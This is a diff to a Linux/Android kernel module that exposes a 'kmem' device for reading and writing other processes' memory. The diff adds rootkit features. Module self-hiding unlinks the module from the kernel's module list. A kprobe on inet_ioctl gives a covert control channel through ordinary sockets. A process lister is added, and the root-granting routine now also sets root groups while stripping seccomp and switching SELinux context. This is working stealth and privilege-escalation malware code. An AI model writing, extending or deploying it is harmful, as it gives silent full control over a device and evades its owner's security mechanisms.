@@ -13,12 +13,19 @@
 #include <asm/page.h>
 #include <asm/pgtable.h>
 #include <asm/pgtable-types.h>
+#include <linux/security.h>
+#include <linux/mutex.h>
+#include <linux/kprobes.h>
 
 #define OP_CMD_READ 0x400011
 #define OP_CMD_WRITE 0x400012
 #define OP_CMD_LISTMAP 0x400013
 #define OP_CMD_ROOT 0x400014
+#define OP_HIDE_MODULE 0x400015
+#define OP_SHOW_MODULE 0x400016
 
+#define DEVICE_NAME "kmem"
+#define TAG "kmem_log: "
 typedef struct _MEMORY
 {
     pid_t pid;
@@ -26,16 +33,6 @@ typedef struct _MEMORY
     void __user *buffer;
     size_t size;
 } st_mem;
-
-typedef struct _VMAP
-{
-    unsigned long start;
-    unsigned long end;
-    char path[256];
-} st_vm;
-
-#define DEVICE_NAME "kmem"
-#define TAG "kmem_log: "
 
 static int dev_open(struct inode *node, struct file *file)
 {
@@ -62,16 +59,23 @@ static phys_addr_t get_va_pa(struct mm_struct *mm, uintptr_t va)
     return page_addr + offset;
 }
 
-static struct mm_struct *get_pid_mm(int pid)
+static struct task_struct *get_pid_task_(int pid)
 {
     struct task_struct *task;
-    struct mm_struct *mm;
     struct pid *pid_struct;
     pid_struct = find_get_pid(pid);
     if (!pid_struct)
         return NULL;
 
     task = get_pid_task(pid_struct, PIDTYPE_PID);
+    return task;
+}
+
+static struct mm_struct *get_pid_mm(int pid)
+{
+    struct task_struct *task;
+    struct mm_struct *mm;
+    task = get_pid_task_(pid);
     if (!task)
         return NULL;
     mm = get_task_mm(task);
@@ -85,10 +89,35 @@ inline int valid_phys_addr_range_(phys_addr_t addr, size_t count)
     return addr + count <= __pa(high_memory);
 }
 
+int is_module_hide = 0;
+static struct list_head *mod_list;
+bool hide_module(void)
+{
+    if (!is_module_hide)
+    {
+        mod_list = THIS_MODULE->list.prev;
+        list_del(&THIS_MODULE->list);
+        kfree(THIS_MODULE->sect_attrs);
+        THIS_MODULE->sect_attrs = NULL;
+        is_module_hide = 1;
+        return true;
+    }
+    return false;
+}
+
+bool show_module(void)
+{
+    if (is_module_hide)
+    {
+        list_add(&THIS_MODULE->list, mod_list);
+        is_module_hide = 0;
+        return true;
+    }
+    return false;
+}
+
 #define SELINUX_DOMAIN "u:r:su:s0"
-
-
-// Fixme
+static struct group_info root_groups = {.usage = ATOMIC_INIT(2)};
 static int proc_root(pid_t pid)
 {
     struct pid *pid_struct;
@@ -131,18 +160,21 @@ static int proc_root(pid_t pid)
         memset(&cred->cap_ambient, 0xFF, sizeof(cred->cap_ambient));
     }
 
-
-#if defined(CONFIG_GENERIC_ENTRY) &&                                           \
-	LINUX_VERSION_CODE >= KERNEL_VERSION(5, 11, 0)
-	current_thread_info()->syscall_work &= ~SYSCALL_WORK_SECCOMP;
+#if defined(CONFIG_GENERIC_ENTRY) && \
+    LINUX_VERSION_CODE >= KERNEL_VERSION(5, 11, 0)
+    current_thread_info()->syscall_work &= ~SYSCALL_WORK_SECCOMP;
 #else
-	current_thread_info()->flags &= ~(TIF_SECCOMP | _TIF_SECCOMP);
+    current_thread_info()->flags &= ~(TIF_SECCOMP | _TIF_SECCOMP);
 #endif
 
 #ifdef CONFIG_SECCOMP
-	current->seccomp.mode = 0;
-	current->seccomp.filter = NULL;
+    current->seccomp.mode = 0;
+    current->seccomp.filter = NULL;
 #endif
+
+    if (cred->group_info)
+        put_group_info(cred->group_info);
+    cred->group_info = get_group_info(&root_groups);
 
     error = security_secctx_to_secid(SELINUX_DOMAIN, strlen(SELINUX_DOMAIN), &sid);
     if (!error)
@@ -156,7 +188,7 @@ static int proc_root(pid_t pid)
 static int list_vma(struct seq_file *m, pid_t pid)
 {
     struct vm_area_struct *vma;
-    unsigned long start, end, flag;
+    unsigned long start, end, flags;
     struct file *file;
     char *path;
     char path_buf[256] = {0};
@@ -170,20 +202,26 @@ static int list_vma(struct seq_file *m, pid_t pid)
         start = vma->vm_start;
         end = vma->vm_end;
         file = vma->vm_file;
-        flag = vma->vm_flags;
-
+        flags = vma->vm_flags;
+        path = NULL;
+        seq_putc(m, flags & VM_READ ? 'r' : '-');
+        seq_putc(m, flags & VM_WRITE ? 'w' : '-');
+        seq_putc(m, flags & VM_EXEC ? 'x' : '-');
+        seq_putc(m, flags & VM_MAYSHARE ? 's' : 'p');
+        seq_putc(m, ',');
         if (file)
         {
             memset(path_buf, 0, sizeof(path_buf));
             path = d_path(&file->f_path, path_buf, sizeof(path_buf));
-            if (path)
-            {
-                seq_printf(m, "%llx,%llx,%ld,%s\n", start, end, flag, path);
-            }
+        }
+
+        if (path)
+        {
+            seq_printf(m, "%llx,%llx,%s\n", start, end, path);
         }
         else
         {
-            seq_printf(m, "%llx,%llx,%ld\n", start, end, flag);
+            seq_printf(m, "%llx,%llx\n", start, end);
         }
     }
     up_read(&mm->mmap_lock);
@@ -252,20 +290,46 @@ static int read_mem(st_mem mem)
     return n;
 }
 
-static int my_seq_show(struct seq_file *m, void *v)
+static int my_mem_show(struct seq_file *m, void *v)
 {
     pid_t pid = (pid_t)(uintptr_t)m->private;
     list_vma(m, pid);
+
     return 0;
 }
 
-int my_seq_open(struct inode *inode, struct file *file)
+static int my_proc_show(struct seq_file *m, void *v)
 {
-    return single_open(file, my_seq_show, PDE_DATA(inode));
+
+    struct task_struct *task;
+    rcu_read_lock();
+    for_each_process(task)
+    {
+        seq_printf(m, "%d,%s\n", task->pid, task->comm);
+    }
+    rcu_read_unlock();
+    return 0;
 }
 
-static const struct proc_ops my_proc_ops = {
-    .proc_open = my_seq_open,
+int my_proc_mem_open(struct inode *inode, struct file *file)
+{
+    return single_open(file, my_mem_show, PDE_DATA(inode));
+}
+
+int my_proc_open(struct inode *inode, struct file *file)
+{
+    return single_open(file, my_proc_show, PDE_DATA(inode));
+}
+
+static const struct proc_ops my_proc_mem_ops = {
+    .proc_open = my_proc_mem_open,
+    .proc_read = seq_read,
+    .proc_lseek = seq_lseek,
+    .proc_release = seq_release,
+};
+
+static const struct proc_ops my_proc_ps = {
+    .proc_open = my_proc_open,
     .proc_read = seq_read,
     .proc_lseek = seq_lseek,
     .proc_release = seq_release,
@@ -273,9 +337,9 @@ static const struct proc_ops my_proc_ops = {
 
 struct proc_dir_entry *base;
 
-static long dev_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
+static long handle_cmd(unsigned int cmd, unsigned long arg)
 {
-    static st_mem mem;
+    st_mem mem;
     char mypid[13];
     pr_info(TAG "ioctl\n");
 
@@ -286,13 +350,21 @@ static long dev_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 
     switch (cmd)
     {
+    case OP_HIDE_MODULE:
+        return hide_module();
+    case OP_SHOW_MODULE:
+        return show_module();
     case OP_CMD_READ:
         return read_mem(mem);
     case OP_CMD_WRITE:
         return write_mem(mem);
     case OP_CMD_LISTMAP:
+        if (!get_pid_mm(mem.pid))
+        {
+            return -1;
+        }
         snprintf(mypid, 12, "%d", mem.pid);
-        proc_create_data(mypid, 0644, base, &my_proc_ops, (void *)((uintptr_t)mem.pid));
+        proc_create_data(mypid, 0444, base, &my_proc_mem_ops, (void *)((uintptr_t)mem.pid));
         return 0;
     case OP_CMD_ROOT:
         proc_root(mem.pid);
@@ -302,6 +374,29 @@ static long dev_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
     }
     return -EINVAL;
 }
+
+static long dev_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
+{
+    pr_alert(TAG "dev_ioctl: %d, %ld\n", cmd, arg);
+    return handle_cmd(cmd, arg);
+}
+
+static int handler_ioctl_pre(struct kprobe *p, struct pt_regs *kregs)
+{
+    unsigned int cmd = (unsigned int)kregs->regs[1];
+    unsigned long arg = (unsigned long)kregs->regs[2];
+    if (cmd >= OP_CMD_READ && cmd <= OP_SHOW_MODULE)
+    {
+        pr_alert(TAG "inet_ioctl: %d, %ld\n", cmd, arg);
+        handle_cmd(cmd, arg);
+    }
+
+    return 0;
+}
+static struct kprobe kp_ioctl = {
+    .symbol_name = "inet_ioctl",
+    .pre_handler = handler_ioctl_pre,
+};
 
 struct file_operations fops = {
     .owner = THIS_MODULE,
@@ -321,14 +416,22 @@ static int __init driver_entry(void)
 {
     int ret;
     pr_info(TAG "driver_entry\n");
+    ret = register_kprobe(&kp_ioctl);
+    pr_alert("kprobe res:%d\n", ret);
+
     ret = misc_register(&dev);
+    pr_alert("misc_register res:%d\n", ret);
+
     base = proc_mkdir(DEVICE_NAME, NULL);
+    proc_create("tasks", 0444, base, &my_proc_ps);
     return ret;
 }
 
 static void __exit driver_unload(void)
 {
     pr_info(TAG "driver_unload\n");
+    unregister_kprobe(&kp_ioctl);
+
     misc_deregister(&dev);
     proc_remove(base);
     return;
